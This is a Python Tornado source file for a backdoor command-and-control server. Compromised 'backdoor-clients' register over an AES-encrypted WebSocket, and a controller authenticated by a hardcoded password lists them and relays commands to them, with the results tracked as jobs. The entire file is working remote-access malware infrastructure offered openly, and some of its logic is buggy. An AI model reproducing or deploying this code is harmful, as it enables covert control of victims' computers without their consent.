#!/usr/bin/env python
# -*- coding: utf-8 -*-
import tornado.web
import tornado.websocket
import tornado.ioloop
import json
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
__author__ = 'nekocode'

# config
PASSWORD = '110110zxc'


class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
    clients = dict()
    ID_LASTEST = 0

    def data_received(self, chunk):
        pass

    def send_to_all(self, message):
        for key, c in self.clients:
            c.write_message(json.dumps(message))

    def __init__(self, application, request, **kwargs):
        tornado.websocket.WebSocketHandler.__init__(self, application, request, **kwargs)
        self.HOST_NAME = None
        self.ID = None
        self.UUID = None
        self.IV = '\0' * AES.block_size
        self.SECRET = None
        self.is_controller = False
        self.jobs = list()

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain

    def open(self):
        pass

    def send_data(self, data):
        self.write_message(self.encrypt(json.dumps({'data': data})))

    def on_message(self, message):
        if self.UUID and self.SECRET:
            # --Command--
            json_str = self.decrypt(message)
            msg = json.loads(json_str)

            if self.is_controller and 'cmd' in msg:
                command = msg['cmd']
                if command == 'list':
                    data = 'List all online backdoor-clients:\n'
                    for key, client in self.clients.items():
                        data += str(key) + '\t' + client.UUID + '\t' + \
                                self.request.remote_ip + '\t' + self.HOST_NAME + '\n'
                    self.send_data(data)

                elif command == 'jobs':
                    data = 'List all jobs:\n\n'
                    for job in self.jobs:
                        data += job[0] + '\nResult:\n' + job[1] + '\n\n'
                    self.send_data(data)

                elif 'to' in msg:
                    # --Transfer--
                    to = int(msg['to'])
                    if to in self.clients:
                        to_client = self.clients[to]
                        if not to_client.is_controller:
                            msg['jobid'] = str(len(self.jobs))
                            msg['from'] = self.ID
                            msg_json = json.dumps(msg)
                            to_client.write_message(to_client.encrypt(msg_json))
                            self.jobs.append([msg_json, 'Running'])
                            self.send_data('Send command to client success.\n')

                        else:
                            self.send_data('Should not send control command to controller.\n')

                    else:
                        self.send_data('Not available target.\n')

            elif 'jobid' in msg:
                to = int(msg['to'])
                jobid = int(msg['jobid'])
                if to in self.clients:
                    to_client = self.clients[to]
                    to_client.jobs[jobid][1] = msg['rlt']
                pass

        else:
            # --Login--
            msg = json.loads(message)

            if 'uuid' in msg:
                self.UUID = msg['uuid']
                self.HOST_NAME = msg['host_name']
                self.SECRET = b64decode(msg['secret'])
                if 'pwd' in msg:
                    if PASSWORD == self.decrypt(msg['pwd']):
                        self.is_controller = True
                        self.send_data('login success')
                    else:
                        self.send_data('login failed')
                        return

                self.ID = self.ID_LASTEST
                self.clients[self.ID] = self
                print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
                BackdoorSocketHandler.ID_LASTEST += 1

    def on_close(self):
        if self.ID in self.clients:
            self.clients.pop(self.ID)


def run_server():
    application = tornado.web.Application([
        (r'/', BackdoorSocketHandler)
    ])

    application.listen(8888, xheaders=True)
    tornado.ioloop.IOLoop.instance().start()


if __name__ == '__main__':
    run_server()

